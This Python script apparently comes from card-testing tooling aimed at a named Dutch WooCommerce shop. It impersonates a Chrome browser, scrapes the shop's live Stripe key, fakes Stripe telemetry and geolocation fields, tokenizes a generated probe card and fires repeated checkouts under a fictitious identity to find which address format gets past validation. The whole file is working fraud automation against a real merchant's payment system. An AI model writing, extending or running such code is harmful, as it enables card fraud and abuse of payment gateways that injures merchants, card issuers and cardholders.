# language: python, file: scratch/_debug_nl_addr.py — перебор форматов address_1 для wcnlpc
import asyncio
import json
import sys

from curl_cffi.requests import AsyncSession

import gate_client as gc

sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

VARIANTS = [
    ("street+num NL", "Damstraat 12"),
    ("num only", "12"),
    ("num+street", "12 Damstraat"),
    ("street only", "Damstraat"),
    ("with city", "Damstraat 12, Amsterdam"),
    ("US style", "100 Main Street"),
]

BASE = {
    "billing_address": {
        "first_name": "Willem", "last_name": "de Vries", "company": "",
        "address_1": "", "address_2": "",
        "city": "Amsterdam", "state": "NH", "postcode": "1012 AB",
        "country": "NL", "email": "willem.devries1204@hotmail.com",
        "phone": "+31 20 555 0101",
    },
    "shipping_address": {
        "first_name": "Willem", "last_name": "de Vries", "company": "",
        "address_1": "", "address_2": "",
        "city": "Amsterdam", "state": "NH", "postcode": "1012 AB",
        "country": "NL",
    },
    "customer_note": "", "create_account": False, "terms": True,
    "payment_method": "stripe_cc",
}


async def main():
    root = "https://magnesiumshop.nl"
    api = f"{root}/wp-json/wc/store/v1"
    async with AsyncSession(impersonate="chrome131", verify=False) as s:
        r_cart = await s.get(f"{api}/cart", timeout=10)
        nonce = r_cart.headers.get("nonce", "")
        r_prod = await s.get(f"{api}/products", params={"per_page": 30},
                             headers={"Nonce": nonce}, timeout=10)
        items = sorted((p for p in r_prod.json()
                        if p.get("prices", {}).get("price")
                        and int(p["prices"]["price"]) > 0),
                       key=lambda p: int(p["prices"]["price"]))
        await s.post(f"{api}/cart/add-item",
                     params={"id": items[0]["id"], "quantity": "1"},
                     headers={"Nonce": nonce}, timeout=10)

        pk = ""
        for path in ("/checkout/", "/", "/shop/"):
            r0 = await s.get(root + path, timeout=10)
            pk = gc.extract_pk_live(r0.text)
            if pk:
                break
        telem = gc.stripe_telemetry(root, pk)
        telem.update(gc.geo_identity_fields("NL"))
        probe = gc.gen_probe_card()
        r_tok = await s.post("https://api.stripe.com/v1/payment_methods",
                             data=gc.tokenize_body(probe, telem, root),
                             headers=gc.TOKENIZE_HEADERS, timeout=8)
        pm_id = r_tok.json()["id"]

        for label, addr in VARIANTS:
            body = json.loads(json.dumps(BASE))
            body["billing_address"]["address_1"] = addr
            body["shipping_address"]["address_1"] = addr
            body["payment_data"] = [
                {"key": "wc-stripe-payment-method", "value": pm_id},
                {"key": "wc-stripe-payment-type", "value": "card"},
            ]
            r = await s.post(f"{api}/checkout", json=body,
                             headers={"Nonce": nonce}, timeout=25)
            try:
                d = r.json()
                params = (d.get("data") or {}).get("params") or {}
                print(f"{label:14} -> {r.status_code} {str(params)[:150]}")
            except Exception:
                print(f"{label:14} -> {r.status_code} {r.text[:100]}")


if __name__ == "__main__":
    asyncio.run(main())
